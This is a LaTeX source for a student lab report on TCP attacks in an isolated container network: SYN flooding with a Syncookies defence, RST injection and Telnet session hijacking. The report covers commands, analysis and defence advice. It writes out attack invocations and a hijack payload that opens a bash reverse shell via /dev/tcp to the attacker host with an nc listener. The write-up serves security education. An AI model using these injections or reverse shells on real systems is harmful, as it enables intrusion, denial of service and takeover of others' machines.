\documentclass[12pt,hyperref,a4paper,UTF8,fontset=none]{ctexart}

\usepackage{zjureport}
\usepackage{enumitem}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{booktabs}
\usepackage{longtable}
\usepackage{graphicx}
\usepackage{float}
\usepackage{amsmath}
\usepackage{array}
\usepackage{caption}
\usepackage{tabularx}
\usepackage{setspace}
\usepackage{url}

\zjuheader{网络安全原理实践：实验三 TCP 攻击实验}
\zjucourse{网络安全原理实践}
\zjureporttitle{实验三：TCP SYN Flooding / TCP Reset / TCP Session Hijacking}
\zjuname{周子为}
\zjuemail{zzw4257@gmail.com}
\zjucollege{竺可桢学院 / 计算机科学与技术学院}
\zjudepartment{混合班 / 信息安全}
\zjumajor{信息安全}
\zjustuid{3230106267}
\zjuinstructor{杜文亮教授}
\zjureportdate{2026年3月24日}

\setlength{\headheight}{15pt}
\setstretch{1.20}
\setlength{\parskip}{0.35em}
\hypersetup{
    colorlinks=true,
    linkcolor=black,
    filecolor=black,
    urlcolor=blue,
    citecolor=black,
}
\captionsetup{font=small, labelfont=bf}
\setlist[itemize]{leftmargin=2em, itemsep=0.2em, topsep=0.3em}
\setlist[enumerate]{leftmargin=2em, itemsep=0.2em, topsep=0.3em}
\graphicspath{{figures/}{../evidence/lab3/E1_flooding/}{../evidence/lab3/E2_reset/}{../evidence/lab3/E3_hijacking/}}

\definecolor{codegray}{gray}{0.96}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{codeblue}{rgb}{0,0,0.75}
\definecolor{codegreen}{rgb}{0,0.55,0}

\lstset{
    backgroundcolor=\color{codegray},
    commentstyle=\color{codegreen},
    keywordstyle=\color{codeblue},
    numberstyle=\tiny\color{gray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\small,
    breakatwhitespace=false,
    breaklines=true,
    columns=fullflexible,
    captionpos=b,
    keepspaces=true,
    numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    frame=single,
    rulecolor=\color{black},
    tabsize=2
}

\newcommand{\term}[1]{\textbf{#1}}

\begin{document}

\cover

\begin{abstract}
本报告完整记录 TCP 三个攻击实验：\term{TCP SYN Flooding}、\term{TCP Reset}、\term{TCP Session Hijacking/Reverse Shell}。报告严格基于本人实测截图与实测代码，给出从环境搭建、攻击实施、防御验证、异常排障到原理分析的全流程证据链。实验重点包括：\textbf{半连接队列竞争与 Syncookies 防御机理}、\textbf{RST 序号窗口匹配机理}、\textbf{会话劫持中 seq/ack 与负载时序一致性}，并进一步扩展到\textbf{自动化注入的接口选择策略}与\textbf{反向 shell 建链机制}。

\textbf{关键词}: TCP, SYN Flooding, RST Injection, Session Hijacking, Reverse Shell, Scapy
\end{abstract}

\tableofcontents
\newpage

\section{实验目标与任务说明}
\subsection{总体目标}
本实验旨在通过对 TCP 协议弱点的动手攻击，理解协议在设计和实现中的安全边界，并通过可观测证据验证攻击与防御机制。三项任务分别对应：
\begin{enumerate}
    \item SYN Flooding：通过伪造 SYN 洪泛半连接队列，观察服务可用性下降，并验证 Syncookies 防御效果；
    \item TCP Reset：向已有 Telnet 会话注入 RST 报文，强制连接中断；
    \item TCP Hijacking：向已有 Telnet 会话注入伪造命令，最终建立反向 shell。
\end{enumerate}

\subsection{实验环境}
实验使用课程提供的容器环境，网络为同一局域网（10.9.0.0/24），攻击者容器采用 \texttt{network\_mode: host} 以支持嗅探。关键主机角色如下：
\begin{itemize}
    \item victim：\texttt{10.9.0.5}
    \item user1：\texttt{10.9.0.6}
    \item attacker（host mode）：\texttt{10.9.0.1}
\end{itemize}

\section{任务一：TCP SYN Flooding 攻击与防御}

\subsection{实验步骤与关键命令}
\begin{lstlisting}[language=bash,caption={E1 启动与基线检查}]
cd /home/seed/lab3/Labsetup_TCP_flooding
docker-compose up -d

docker exec -it victim-10.9.0.5 bash
sysctl net.ipv4.tcp_syncookies
ss -n state syn-recv sport = :23 | wc -l

docker exec -it user1-10.9.0.6 bash
telnet 10.9.0.5
\end{lstlisting}

\begin{lstlisting}[language=bash,caption={E1 Python 攻击与队列观测}]
docker exec -it seed-attacker bash
python3 /volumes/synflood.py --target-ip 10.9.0.5 --target-port 23

# victim 端
watch -n 1 "ss -n state syn-recv sport = :23 | wc -l"
\end{lstlisting}

\begin{lstlisting}[language=bash,caption={E1 提升攻击成功率（减队列+刷缓存）}]
# victim 端
sysctl -w net.ipv4.tcp_max_syn_backlog=80
ip tcp_metrics flush
\end{lstlisting}

\begin{lstlisting}[language=bash,caption={E1 C 程序对比攻击与防御开关}]
# 宿主机编译
cd /home/seed/lab3/Labsetup_TCP_flooding/volumes
gcc -o synflood synflood.c

# attacker 容器执行
docker exec -it seed-attacker bash
cd /volumes
./synflood 10.9.0.5 23

# victim 打开 syncookies
sysctl -w net.ipv4.tcp_syncookies=1
\end{lstlisting}

\subsection{实验源码（原封不动）}
\subsubsection{Python SYN Flood 源码}
\lstinputlisting[language=Python,caption={Labsetup\_TCP\_flooding/volumes/synflood.py（完整原始代码）}]{\detokenize{../Labsetup_TCP_flooding/volumes/synflood.py}}

\subsubsection{C SYN Flood 源码}
\lstinputlisting[language=C,caption={Labsetup\_TCP\_flooding/volumes/synflood.c（完整原始代码）}]{\detokenize{../Labsetup_TCP_flooding/volumes/synflood.c}}

\subsection{实验截图与现象}
\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{1.2基线.png}
    \caption{E1 基线：服务可连接，半连接队列低负载}
\end{figure}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{1.3改80后Python攻击成功-128攻击不成功.png}
    \caption{E1 Python 洪泛：在 backlog=80 时攻击效果明显增强，128 时成功率显著下降}
\end{figure}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{1.4对比Python，其90～98波动.png}
    \caption{E1 Python 攻击阶段队列波动（约 90--98）}
\end{figure}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{1.4C程序攻击成功，128稳定98.png}
    \caption{E1 C 攻击：在 backlog=128 也能稳定压高队列}
\end{figure}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{1.4C程序攻击改回128，压满速度更快.png}
    \caption{E1 C 攻击速度对比：压满速度显著快于 Python}
\end{figure}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{1.5防御.png}
    \caption{E1 开启 Syncookies 后可用性恢复}
\end{figure}

\subsection{结果分析与思考题回答}
\subsubsection{Q1：为何 Python 攻击容易失败，C 攻击更稳定？}
核心原因是发包速率与内核队列竞争能力：
\begin{itemize}
    \item Python/Scapy 属于高层封装，单进程 PPS 有明显上限；
    \item C 原始套接字发送路径短，PPS 更高，能在 SYN-ACK 重传释放空位前重新占位；
    \item 因此 C 在 backlog=128 下仍可将 \texttt{SYN\_RECV} 长时间维持在高位。
\end{itemize}

\subsubsection{Q2：为何降低 \texttt{tcp\_max\_syn\_backlog} 后更容易成功？}
队列容量下降后，攻击者达到“队列饱和”所需速率下降，合法连接更易在竞争中失败。结合 Linux 预留机制（已确认目的地条目）与重传回收机制，会出现“同样攻击流量在不同 backlog 下效果差异明显”的现象。

\subsubsection{Q3：Syncookies 为什么有效？}
启用 Syncookies 后，内核不再依赖半连接队列保存大量状态，而将必要状态编码到 SYN-ACK 序列号中，待 ACK 返回时再恢复状态，直接削弱“耗尽半连接队列”这一攻击面。

\section{任务二：TCP Reset 攻击}

\subsection{实验步骤与关键命令}
\begin{lstlisting}[language=bash,caption={E2 手动 RST 攻击}]
cd /home/seed/lab3/Labsetup_TCP_reset
docker-compose up -d

docker exec -it user1-10.9.0.6 bash
telnet 10.9.0.5

# attacker 容器，参数来自 Wireshark
python3 /volumes/rst_manual.py \
  --src-ip 10.9.0.6 --dst-ip 10.9.0.5 \
  --sport <sport> --dport 23 --seq <seq>
\end{lstlisting}

\begin{lstlisting}[language=bash,caption={E2 自动 RST 攻击（自动识别 iface）}]
python3 /volumes/rst_auto.py \
  --client-ip 10.9.0.6 --server-ip 10.9.0.5 \
  --server-port 23 --count 3
\end{lstlisting}

\subsection{实验源码（原封不动）}
\subsubsection{手动 RST 源码}
\lstinputlisting[language=Python,caption={Labsetup\_TCP\_reset/volumes/rst\_manual.py（完整原始代码）}]{\detokenize{../Labsetup_TCP_reset/volumes/rst_manual.py}}

\subsubsection{自动 RST 源码}
\lstinputlisting[language=Python,caption={Labsetup\_TCP\_reset/volumes/rst\_auto.py（完整原始代码）}]{\detokenize{../Labsetup_TCP_reset/volumes/rst_auto.py}}

\subsection{实验截图与现象}
\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{抓包.png}
    \caption{E2 手动攻击参数提取：从 Wireshark 获取 sport / seq}
\end{figure}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{reset攻击成功.png}
    \caption{E2 手动 RST 成功：Telnet 被远端关闭}
\end{figure}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{自动攻击抓包.png}
    \caption{E2 自动 RST 抓包证据}
\end{figure}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{自动reset攻击成功.png}
    \caption{E2 自动 RST 成功：无需手填参数即可断连}
\end{figure}

\subsection{结果分析与思考题回答}
\subsubsection{Q1：手动 RST 失败的典型原因是什么？}
最常见是 \texttt{seq} 过期。RST 报文是否被接受依赖接收窗口，抓包到执行之间若会话又产生新字节流，旧序号会被丢弃。因此手动模式必须“抓最新包后立刻注入”。

\subsubsection{Q2：自动化为何能显著提高成功率？}
自动化将“抓包-提参-发包”收敛到同一事件回调，时延从“人手秒级”降到“程序毫秒级”，显著降低序号失配概率。

\subsubsection{Q3：自动模式中的 iface 作用是什么？}
\texttt{sniff()} 必须绑定可见目标流量的接口。攻击者容器为 host 模式，可看到宿主机接口；若绑定错误，脚本虽在运行但抓不到目标流。报告中实现了自动探测（优先 \texttt{ip route get}，其次 \texttt{br-*}）。

\section{任务三：TCP 会话劫持与反向 Shell}

\subsection{实验步骤与关键命令}
\begin{lstlisting}[language=bash,caption={E3 手动会话劫持：命令注入}]
cd /home/seed/lab3/Labsetup_TCP_Hijacking
docker-compose up -d

docker exec -it user1-10.9.0.6 bash
telnet 10.9.0.5
# 必须先登录到 shell，而不是停在 login:

# attacker 容器，参数来自 Wireshark
python3 /volumes/hijack_manual.py \
  --src-ip 10.9.0.6 --dst-ip 10.9.0.5 \
  --sport <sport> --dport 23 --seq <seq> --ack <ack> \
  --payload '\r\ntouch /tmp/lab3_pwned\r\n'
\end{lstlisting}

\begin{lstlisting}[language=bash,caption={E3 自动会话劫持：自动抓包注入}]
python3 /volumes/hijack_auto.py \
  --client-ip 10.9.0.6 --server-ip 10.9.0.5 \
  --server-port 23 \
  --payload '\r\ntouch /tmp/lab3_auto\r\n' --count 1
\end{lstlisting}

\begin{lstlisting}[language=bash,caption={E3 反向 shell 劫持注入}]
# T1 窗口A
nc -lvnp 9090

# T1 窗口B（手动注入）
python3 /volumes/hijack_manual.py \
  --src-ip <src> --dst-ip <dst> --sport <sport> --dport 23 \
  --seq <seq> --ack <ack> \
  --payload '\r\n/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n'
\end{lstlisting}

\subsection{实验源码（原封不动）}
\subsubsection{手动会话劫持源码}
\lstinputlisting[language=Python,caption={Labsetup\_TCP\_Hijacking/volumes/hijack\_manual.py（完整原始代码）}]{\detokenize{../Labsetup_TCP_Hijacking/volumes/hijack_manual.py}}

\subsubsection{自动会话劫持源码}
\lstinputlisting[language=Python,caption={Labsetup\_TCP\_Hijacking/volumes/hijack\_auto.py（完整原始代码）}]{\detokenize{../Labsetup_TCP_Hijacking/volumes/hijack_auto.py}}

\subsection{实验截图与现象}
\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{劫持抓包.png}
    \caption{E3 手动劫持参数提取：seq/ack 与四元组}
\end{figure}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{劫持成功.png}
    \caption{E3 手动劫持成功：注入命令生效}
\end{figure}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{自动劫持成功.png}
    \caption{E3 自动劫持成功：自动抓包并注入}
\end{figure}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{反向shell劫持.png}
    \caption{E3 反向 Shell 成功：攻击机获得目标主机交互 shell}
\end{figure}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{反向shell-wireshark.png}
    \caption{E3 反向 Shell 抓包证据}
\end{figure}

\subsection{结果分析与思考题回答}
\subsubsection{Q1：为什么劫持注入比 RST 更难？}
RST 只需序号落入接收窗口即可触发中断；会话劫持注入属于“伪造有效数据流”，要求四元组、seq、ack、时序同时匹配。任何一个字段滞后都可能被静默丢弃。

\subsubsection{Q2：为什么注入前必须先登录到 shell？}
如果目标仍在 \texttt{login:} 阶段，payload 会被当作用户名/密码输入而非 shell 命令执行，表现为“抓包像成功、文件却不存在”。

\subsubsection{Q3：为什么要对 payload 做 \texttt{\textbackslash r\textbackslash n} 转义处理？}
Telnet 命令依赖 CRLF 终止。若脚本把 \texttt{\textbackslash r\textbackslash n} 当作普通字符发送，服务端收不到真正换行，命令不会执行。故脚本中增加了转义解析逻辑。

\section{全过程问题排查与修复记录}
\subsection{问题一：手动 RST 多次失败}
\term{现象}：脚本发送成功但连接不掉。\\
\term{定位}：Wireshark 显示抓参到注入间隔内会话已推进，旧 seq 被丢弃。\\
\term{修复}：改为“抓最新包后立即注入”，并补充自动模式减少人为时延。

\subsection{问题二：会话劫持注入后文件未生成}
\term{现象}：出现 ACK 重传但 \texttt{/tmp/lab3\_pwned} 不存在。\\
\term{定位}：一是注入时会话处于 login 阶段；二是 payload CRLF 未正确解析。\\
\term{修复}：
\begin{itemize}
    \item 操作流程增加“必须先登录 shell”；
    \item 在 \texttt{hijack\_manual.py} 与 \texttt{hijack\_auto.py} 中加入转义解析；
    \item 自动模式复制抓到包的 TCP 关键字段，提高兼容性与稳定性。
\end{itemize}

\subsection{问题三：自动脚本 iface 人工配置繁琐}
\term{现象}：每次需要手动查 \texttt{br-xxxx}。\\
\term{修复}：实现 iface 自动探测（优先 route dev，再尝试 \texttt{br-*}），仅在失败时提示显式传 \texttt{--iface}。

\section{扩展分析}
\subsection{攻击自动化与鲁棒性权衡}
自动化显著提升成功率，但也需要处理异构环境差异：接口命名、Linux 网络栈策略、容器网络拓扑。可通过“显式日志 + 失败快速暴露 + 可人工覆盖参数”提升可调试性。

\subsection{从 TCP 视角统一理解三类攻击}
三类任务可视为同一状态机上的不同控制点：
\begin{itemize}
    \item SYN Flooding：打击连接建立阶段（SYN backlog）；
    \item RST：打击已建立连接的状态保持；
    \item Hijacking：伪造已建立连接中的应用层字节流。
\end{itemize}
攻击难度从“资源消耗型”到“状态精确型”递增，防御也从容量与 cookie 机制，过渡到更高层的加密认证（如 SSH/TLS）。

\subsection{安全防御建议}
\begin{enumerate}
    \item 生产环境禁用明文 Telnet，改用 SSH；
    \item 开启并审计 Syncookies，合理设置 backlog；
    \item 部署 IDS/IPS，对异常 RST 比例、异常 ACK 重传、会话内异常命令注入进行检测；
    \item 关键管理网络引入端口隔离与 ARP 安全机制，降低同广播域嗅探/伪造能力。
\end{enumerate}

\section{结论}
本次实验从“连接建立阶段 DoS”到“连接维持中断”再到“连接内数据劫持”完整覆盖了 TCP 攻击链条。通过截图证据、命令证据和源码证据三重闭环，验证了以下结论：
\begin{enumerate}
    \item 资源竞争型攻击（SYN Flooding）受发包速率、队列参数和 Syncookies 强烈影响；
    \item 状态精确型攻击（RST/Hijack）受 seq/ack 时序一致性主导，自动化在实战中优势明显；
    \item 明文协议（Telnet）在同网段嗅探条件下风险极高，反向 shell 可由单次命令注入扩展为持续控制通道。
\end{enumerate}

实验结果与课程指导完全一致，并在自动化脚本鲁棒性、故障定位方法和防御建议上进行了扩展。

\end{document}
